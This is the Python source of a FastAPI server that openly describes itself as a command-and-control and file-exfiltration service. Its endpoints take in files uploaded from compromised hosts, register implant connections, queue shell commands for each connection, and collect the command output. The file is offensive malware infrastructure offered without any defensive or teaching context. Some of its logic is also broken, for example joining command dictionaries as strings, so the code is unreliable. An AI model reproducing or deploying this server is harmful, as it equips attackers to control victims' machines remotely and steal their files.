from bson import ObjectId
from fastapi import FastAPI, File, HTTPException, UploadFile, Request
from fastapi.responses import HTMLResponse, StreamingResponse
from gridfs import GridFS
from pymongo import MongoClient
from pydantic import BaseModel
import os
import datetime

app = FastAPI()

# Initialize the MongoDB client
client = MongoClient("mongodb://localhost:27017/")
db = client["mydatabase"]
connections = db["connections"]
fs = GridFS(db)


# API endpoints to interact with the file exfiltration service
# upload a file to the server
@app.post('/file-exfil/upload')
async def upload_file(file: UploadFile = File(...)):
    if not file:
        return {'error': 'No file part'}

    if file.filename == '':
        return {'error': 'No selected file'}

    # Save the file to MongoDB GridFS
    with fs.new_file(filename=file.filename) as grid_file:
        grid_file.write(file.file.read())

    return {'message': 'File uploaded successfully', 'filename': file.filename}

# list files on the server
@app.get('/file-exfil/list-files')
async def list_files():
    file_list = []

    # Query MongoDB's GridFS for a list of files
    for grid_file in fs.find():
        file_list.append(grid_file.filename)

    return {'file_list': file_list}

# download a file from the server
@app.get('/file-exfil/download/{filename}')
async def download_file(filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Return the file data as a response
    return StreamingResponse(grid_file, media_type='application/octet-stream')

# delete a file from the server
@app.delete('/file-exfil/delete/{filename}')
async def delete_file(filename: str):
    # Delete the file from MongoDB GridFS
    fs.delete({"filename": filename})

    return {'message': 'File deleted successfully', 'filename': filename}

# stream the file content to the client
@app.get('/file-exfil/content/{filename}')
async def file_content(request: Request, filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Return the file data as a response
    return StreamingResponse(grid_file, media_type='application/octet-stream')

# API endpoints to interact with the command and control service
# list all connections
@app.get('/c2/list-connections')
async def list_connections():
    connection_list = []

    # Query MongoDB for a list of connections
    for connection in connections.find():
        connection_list.append(connection)

    return {'connection_list': connection_list}

# register a new connection
@app.post('/c2/register')
async def register_connection(request: Request):
    data = await request.json()

    # Insert the connection into MongoDB
    connection_id = connections.insert_one(data).inserted_id

    return {'message': 'Connection registered successfully', 'connection_id': str(connection_id)}

# unregister a connection
@app.delete('/c2/unregister/{connection_id}')
async def unregister_connection(connection_id: str):
    # Delete the connection from MongoDB
    connections.delete_one({"_id": ObjectId(connection_id)})

    return {'message': 'Connection unregistered successfully', 'connection_id': connection_id}

# add a new command to the database
@app.post('/c2/add-command/{connection_id}')
async def add_command(connection_id: str, request: Request):
    data = await request.json()

    # Add the command to the connection's list of commands
    connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"commands": data}}, upsert=True)

    return {'message': 'Command added successfully', 'connection_id': connection_id}

# return the new commands for the client from the database based on the connection ID
@app.get('/c2/get-commands/{connection_id}')
async def get_commands(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # edit the commands to be returned to the client in the following format: command1; command2; command3 etc.
    # and only return the commands and not the id or the timestamp
    commands = connection['commands']
    for command in commands:
        command.pop('_id')
    commands = "; ".join(commands)

    # clear the commands from the database
    connections.update_one({"_id": ObjectId(connection_id)}, {"$set": {"commands": []}})

    # Return the connection's list of commands
    return {'commands': commands}

# get a list of all commands for one connection from the database to be displayed in the web interface
@app.get('/c2/get-command-list/{connection_id}')
async def get_command_list(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    commands = connection['commands']

    # Return the connection's list of commands
    return {'commands': commands}

# get the command output for one connection from the database
@app.get('/c2/get-command-output/{connection_id}')
async def get_command_output(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # Return the connection's command output
    return {'command_output': connection['command_output']}

# add the command output to the database
@app.post('/c2/add-command-output/{connection_id}')
async def add_command_output(connection_id: str, request: Request):
    output = await request.body()
    data = {}
    data['output'] = output

    # Add the timestamp to the command output
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Add the command output to the connection's list of command output
    connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"command_output": data}})

    return {'message': 'Command output added successfully', 'connection_id': connection_id}

